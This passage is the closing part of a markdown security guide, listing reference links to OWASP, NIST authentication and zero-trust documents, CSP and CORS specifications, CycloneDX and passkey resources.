- [Performance Benchmarks](./52-resilience-patterns.md) — Security and resilience metrics

---

## References & Resources

- OWASP Top 10 2025: https://owasp.org/Top10/
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- NIST 800-63-3 (Authentication): https://pages.nist.gov/800-63-3/
- Security Headers: https://securityheaders.com
- SBOM Spec (CycloneDX): https://cyclonedx.org/
- Passkeys.dev: https://passkeys.dev/
- Zero Trust Architecture (NIST): https://pages.nist.gov/800-207/
- SimpleWebAuthn: https://simplewebauthn.dev
- Content Security Policy Spec: https://www.w3.org/TR/CSP3/
- CORS Specification: https://fetch.spec.whatwg.org/#cors-protocol
